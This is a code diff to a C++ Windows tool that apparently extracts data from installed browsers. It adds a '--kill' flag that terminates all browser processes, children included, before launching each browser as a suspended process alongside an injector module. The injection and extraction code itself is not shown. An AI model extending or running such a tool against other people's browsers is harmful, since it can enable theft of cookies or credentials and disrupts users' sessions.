@@ -5,6 +5,7 @@
 #include "../core/console.hpp"
 #include "../sys/internal_api.hpp"
 #include "browser_discovery.hpp"
+#include "browser_terminator.hpp"
 #include "process_manager.hpp"
 #include "pipe_server.hpp"
 #include "injector.hpp"
@@ -17,15 +18,38 @@ struct GlobalStats {
     int failed = 0;
 };
 
-void ProcessBrowser(const BrowserInfo& browser, bool verbose, bool fingerprint, 
+void ProcessBrowser(const BrowserInfo& browser, bool verbose, bool fingerprint, bool killFirst,
                     const std::filesystem::path& output, const Core::Console& console, GlobalStats& stats) {
     
     console.BrowserHeader(browser.displayName);
 
     try {
-        console.Debug("Terminating browser network services...");
-        ProcessManager::KillNetworkServices(browser.exeName);
-        console.Debug("  [+] Network services terminated");
+        if (killFirst) {
+            console.Debug("Terminating browser processes...");
+            
+            BrowserTerminator terminator(console);
+            TerminationOptions opts;
+            opts.terminateChildren = true;
+            opts.waitForExit = true;
+            
+            auto termStats = terminator.KillByExeName(browser.exeName, opts);
+            if (termStats.processesTerminated > 0) {
+                // Build PID list string
+                std::string pidList;
+                for (size_t i = 0; i < termStats.terminatedPids.size(); ++i) {
+                    if (i > 0) pidList += ", ";
+                    pidList += std::to_string(termStats.terminatedPids[i]);
+                }
+                console.Debug("  [+] Processes terminated (PID: " + pidList + ")");
+            } else {
+                console.Debug("  [+] No running processes found");
+            }
+            Sleep(300);
+        } else {
+            console.Debug("Terminating browser network services...");
+            ProcessManager::KillNetworkServices(browser.exeName);
+            console.Debug("  [+] Network services terminated");
+        }
 
         console.Debug("Creating suspended process: " + Core::ToUtf8(browser.fullPath));
         ProcessManager procMgr(browser);
@@ -67,6 +91,7 @@ void ProcessBrowser(const BrowserInfo& browser, bool verbose, bool fingerprint,
 int wmain(int argc, wchar_t* argv[]) {
     bool verbose = false;
     bool fingerprint = false;
+    bool killBrowsers = false;
     std::wstring targetType;
     std::filesystem::path output = std::filesystem::current_path() / "output";
 
@@ -76,6 +101,7 @@ int wmain(int argc, wchar_t* argv[]) {
         std::wstring arg = argv[i];
         if (arg == L"--verbose" || arg == L"-v") verbose = true;
         else if (arg == L"--fingerprint" || arg == L"-f") fingerprint = true;
+        else if (arg == L"--kill" || arg == L"-k") killBrowsers = true;
         else if ((arg == L"--output-path" || arg == L"-o") && i + 1 < argc) output = argv[++i];
         else if (arg == L"--help" || arg == L"-h") {
             console.Banner();
@@ -83,6 +109,7 @@ int wmain(int argc, wchar_t* argv[]) {
             std::wcout << L"  Options:\n";
             std::wcout << L"    -v, --verbose      Show detailed output\n";
             std::wcout << L"    -f, --fingerprint  Extract browser fingerprint\n";
+            std::wcout << L"    -k, --kill         Kill all browser processes before extraction\n";
             std::wcout << L"    -o, --output-path  Custom output directory\n";
             return 0;
         }
@@ -113,7 +140,7 @@ int wmain(int argc, wchar_t* argv[]) {
             return 0;
         }
         for (const auto& browser : browsers) {
-            ProcessBrowser(browser, verbose, fingerprint, output, mainConsole, stats);
+            ProcessBrowser(browser, verbose, fingerprint, killBrowsers, output, mainConsole, stats);
         }
     } else {
         auto browser = BrowserDiscovery::FindSpecific(targetType);
@@ -121,7 +148,7 @@ int wmain(int argc, wchar_t* argv[]) {
             mainConsole.Error("Browser not found: " + Core::ToUtf8(targetType));
             return 1;
         }
-        ProcessBrowser(*browser, verbose, fingerprint, output, mainConsole, stats);
+        ProcessBrowser(*browser, verbose, fingerprint, killBrowsers, output, mainConsole, stats);
     }
 
     return 0;
